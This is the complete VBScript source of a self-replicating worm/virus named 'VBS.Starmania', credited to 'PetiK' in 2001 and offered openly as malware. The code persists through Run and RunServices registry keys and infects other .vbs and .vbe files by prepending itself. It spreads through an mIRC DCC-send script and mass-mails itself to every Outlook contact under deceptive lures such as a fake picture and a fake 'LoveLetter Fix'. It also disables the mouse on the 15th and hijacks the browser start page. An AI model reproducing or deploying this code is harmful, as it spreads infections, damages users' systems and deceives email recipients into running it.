'VBS.Starmania
'Coded by PetiK on 09/05/2001
'Made In France
On Error Resume Next
Dim f,w,file
Set f=CreateObject("Scripting.FileSystemObject")
Set w=CreateObject("WScript.Shell")
Set file=f.OpenTextFile(WScript.ScriptFullName,1)
vbsworm=file.ReadAll

START()
Sub START()
Set win=f.GetSpecialFolder(0)
Set sys=f.GetSpecialFolder(1)
Set cop=f.GetFile(WScript.ScriptFullName)
cop.Copy(win&"\Hwinfo.vbs")
cop.Copy(sys&"\Issetup.vbs")
run=("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Hwinfo")
runs=("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\Issetup")
w.RegWrite run,(win&"\Hwinfo.vbs")
w.RegWrite runs,(sys&"\Issetup.vbs")

MD=w.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\explorer\Shell Folders\Personal")
ptk(win)
ptk(sys)
ptk(f.GetSpecialFolder(2))
ptk(win&"\Samples\Wsh")
ptk(win&"\Desktop")
ptk(MD)

Worm ""
Mess()
Raffle()
Email()

End Sub

Function ptk(Folder)
If f.FolderExists(Folder) then
For each P in f.GetFolder(Folder).Files
ext=f.GetExtensionName(P.Name)
If ext="vbs" or ext="vbe" Then
Set VF=f.OpenTextFile(P.path, 1)
mark=VF.Read(14)
VF.Close

If mark <> "'VBS.Starmania" Then
Set VF=f.OpenTextFile(P.path, 1)
VC=VF.ReadAll
VF.Close
VCd=vbsworm & VC

Set VF=f.OpenTextFile(P.path,2,True)
VF.Write VCd
VF.Close
End If
End If
Next
End If
End Function

Function Worm(Path)
If Path = "" Then
prgfl=w.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If f.FileExists("C:\mirc\mirc.ini") Then Path = "C:\mirc"
If f.FileExists(prgfl & "\mirc\mirc.ini") Then Path = prgfl & "\mirc"
If f.FileExists("C:\mirc32\mirc.ini") Then Path = "C:\mirc32"
If f.FileExists(prgfl & "\mirc32\mirc.ini") Then Path = prgfl & "\mirc32"
End If
If Path <> "" Then
Set mirc=f.CreateTextFile(Path & "\script.ini", True)
mirc.WriteLine "[script]"
mirc.WriteLine "n0=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt } "
mirc.WriteLine "n1=  /dcc send $nick " & f.GetSpecialFolder(0) &"\Hwinfo.vbs"
mirc.WriteLine "n2=}"
End If
End Function

Sub Mess()
If Day(Now) = 15 Then
w.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\StarMania","rundll32 mouse,disable"
w.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeText","How are you today ? For my part, I'm fine"
w.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Winlogon\LegalNoticeCaption","VBS.Starmania"
w.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner","Starmania"
w.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization","PetiK Corpor@tion"
MsgBox "Hi man, it's my new Worm/Virus. It was coded by PetiK in 2001", vbinformation, "VBS.Starmania"
End If
End Sub

Sub Raffle()
Randomize
lot=Int((5*Rnd)+1)
If lot = 1 Then
w.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.symantec.com"
elseif lot = 2 Then
w.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.pandasoftware.com"
elseif lot = 3 Then
w.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.avp.ch"
elseif lot = 4 Then
w.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.cia.gov"
elseif lot = 5 Then
w.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.fbi.gov"
End If
End Sub

Sub Email()
Set O=CreateObject("Outlook.Application")
Set mapi=O.GetNameSpace("MAPI")
For Each AL In mapi.AddressLists
If AL.AddressEntries.Count <> 0 Then
For AddListCount = 1 To AL.AddressEntries.Count
Set ALE = AL.AddressEntries(AddListCount)
Set go = O.CreateItem(0)
go.To = ALE.Address
Randomize
num=Int((3*Rnd)+1)
Set c = f.GetFile(WScript.ScriptFullName)

If num = 1 then
c.Copy(fso.GetSpecialFolder(0)&"\NewPic__Cool.jpg.vbs")
go.Subject = "New Picture for you !"
go.Body = "Look at this nice picture attached"
go.Attachments.Add f.BuildPath(f.GetSpecialfolder(0),"NewPic__Cool.jpg.vbs")

elseif num = 2 then
c.Copy(fso.GetSpecialFolder(0)&"\LoveFix.vbs")
go.Subject = "LoveLetter Fix"
go.Body = "Protect you against VBS.LoveLetter.Variant"
go.Attachments.Add f.BuildPath(f.GetSpecialfolder(0),"LoveFix.vbs")

elseif num = 3 then
c.Copy(fso.GetSpecialFolder(0)&"\Win_A_Holiday.vbs")
go.Subject = "How to win a holiday in Paris"
go.Body = "Play at this game attached and win a holiday in Paris"
go.Attachments.Add f.BuildPath(f.GetSpecialfolder(0),"Win_A_Holiday.vbs")
End If
If go.To <> "" Then
go.Send
End If
Next
End If
Next
End Sub
